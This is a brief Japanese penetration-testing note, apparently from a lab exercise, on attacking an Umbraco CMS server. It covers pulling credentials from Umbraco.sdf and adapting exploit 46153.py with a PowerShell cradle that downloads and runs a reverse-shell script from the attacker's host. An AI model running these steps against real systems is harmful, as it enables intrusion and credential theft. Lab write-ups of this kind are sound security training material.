# umbracoCMS

[toc]

### URL

http://10.129.190.136/umbraco

### バージョン情報

```
Web.config
```

一番上の階層にあることが多い

<img src="img/umbracoCMS/image-20230503085346232.png" alt="image-20230503085346232" style="zoom:50%;" />

### 認証情報

```bash
/App_Data/Umbraco.sdf
Strings Umbraco.sdf | head
```

![image-20230503085558384](img/umbracoCMS/image-20230503085558384.png)

### 脆弱性情報

```
searchsploit umbraco
```

![image-20230503085707018](img/umbracoCMS/image-20230503085707018.png)

### 46153.py

* `calc.exe`→`cmd.exe`に変更
* `strings cmd =""`に`/c powershell -c iex(New-object Net.Webclient).Downloadstring('http://10.10.14.75/Invoke-PowerShellTcp.ps1')`を追加する
* 事前に`/c ping 10.10.14.75`を設定して`tcpdump -i tun0 icmp`でテストする

![image-20230503085803456](img/umbracoCMS/image-20230503085803456.png)

テスト

![image-20230503090032970](img/umbracoCMS/image-20230503090032970.png)

